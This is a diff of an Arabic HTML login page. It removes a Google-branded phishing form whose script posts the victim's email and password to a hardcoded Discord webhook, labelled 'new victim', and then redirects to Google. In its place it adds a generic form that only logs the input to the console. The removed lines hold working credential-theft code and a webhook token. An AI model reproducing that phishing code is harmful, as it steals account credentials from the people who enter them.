@@ -1,71 +1,172 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>تسجيل الدخول - Google</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسجيل الدخول - نظام الإدارة</title>
   <style>
+    :root {
+      --primary-color: #4285F4;
+      --error-color: #EA4335;
+      --success-color: #34A853;
+      --text-color: #202124;
+      --border-color: #dadce0;
+    }
+    
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
     body {
-      background-color: #f2f2f2;
-      font-family: Arial, sans-serif;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background-color: #f8f9fa;
+      color: var(--text-color);
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
+      padding: 20px;
+      line-height: 1.6;
     }
-    .login-box {
-      background-color: white;
-      padding: 40px;
+    
+    .login-container {
+      background-color: #fff;
       border-radius: 8px;
-      box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
-      width: 300px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 450px;
+      padding: 40px;
       text-align: center;
     }
+    
+    .logo {
+      margin-bottom: 24px;
+    }
+    
+    .logo img {
+      height: 40px;
+    }
+    
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      margin-bottom: 24px;
+    }
+    
+    .form-group {
+      margin-bottom: 20px;
+      text-align: right;
+    }
+    
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 14px;
+      color: var(--text-color);
+    }
+    
     input {
       width: 100%;
-      padding: 10px;
-      margin: 10px 0;
+      padding: 12px 16px;
+      border: 1px solid var(--border-color);
+      border-radius: 4px;
+      font-size: 16px;
+      transition: border 0.3s;
     }
+    
+    input:focus {
+      border-color: var(--primary-color);
+      outline: none;
+      box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.2);
+    }
+    
     button {
       width: 100%;
-      padding: 10px;
-      background-color: #1a73e8;
+      padding: 12px;
+      background-color: var(--primary-color);
       color: white;
       border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 500;
       cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    
+    button:hover {
+      background-color: #3367d6;
+    }
+    
+    .footer {
+      margin-top: 30px;
+      font-size: 14px;
+      color: #5f6368;
+    }
+    
+    .footer a {
+      color: var(--primary-color);
+      text-decoration: none;
+    }
+    
+    .footer a:hover {
+      text-decoration: underline;
+    }
+    
+    /* Responsive design */
+    @media (max-width: 480px) {
+      .login-container {
+        padding: 30px 20px;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="login-box">
-    <h2>تسجيل الدخول إلى Google</h2>
-    <form onsubmit="sendToDiscord(); return false;">
-      <input type="text" id="email" placeholder="البريد الإلكتروني" required>
-      <input type="password" id="password" placeholder="كلمة المرور" required>
-      <button type="submit">التالي</button>
+  <div class="login-container">
+    <div class="logo">
+      <img src="https://via.placeholder.com/150x40?text=Company+Logo" alt="شعار الشركة">
+    </div>
+    
+    <h1>تسجيل الدخول إلى حسابك</h1>
+    
+    <form id="loginForm">
+      <div class="form-group">
+        <label for="email">البريد الإلكتروني</label>
+        <input type="email" id="email" name="email" required autocomplete="email">
+      </div>
+      
+      <div class="form-group">
+        <label for="password">كلمة المرور</label>
+        <input type="password" id="password" name="password" required autocomplete="current-password">
+      </div>
+      
+      <button type="submit">تسجيل الدخول</button>
     </form>
+    
+    <div class="footer">
+      <a href="#">نسيت كلمة المرور؟</a> | 
+      <a href="#">إنشاء حساب جديد</a>
+    </div>
   </div>
 
   <script>
-    function sendToDiscord() {
-      var email = document.getElementById("email").value;
-      var password = document.getElementById("password").value;
-      var webhookURL = "https://discordapp.com/api/webhooks/1399397276287238214/7ewH5rbPYRfX4HW2o5ano6PG48nJvEO6YsQvjMc5hxP21cuKVz9wl-zhlyaE-CVJJk-J";
-
-      var content = {
-        content: `📥 ضحية جديدة:\n📧 Email: ${email}\n🔑 Password: ${password}`
-      };
-
-      fetch(webhookURL, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(content)
-      }).then(() => {
-        window.location.href = "https://accounts.google.com";
-      });
-    }
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      // هنا يمكنك إضافة منطق تسجيل الدخول الآمن
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      
+      // في تطبيق حقيقي، يجب إرسال البيانات إلى خادم آمن عبر HTTPS
+      console.log('بيانات تسجيل الدخول:', { email, password });
+      
+      // عرض رسالة للمستخدم
+      alert('تم استلام بيانات تسجيل الدخول بنجاح. في تطبيق حقيقي، سيتم التحقق من صحة البيانات.');
+      
+      // إعادة تعيين النموذج
+      this.reset();
+    });
   </script>
 </body>
 </html>
-
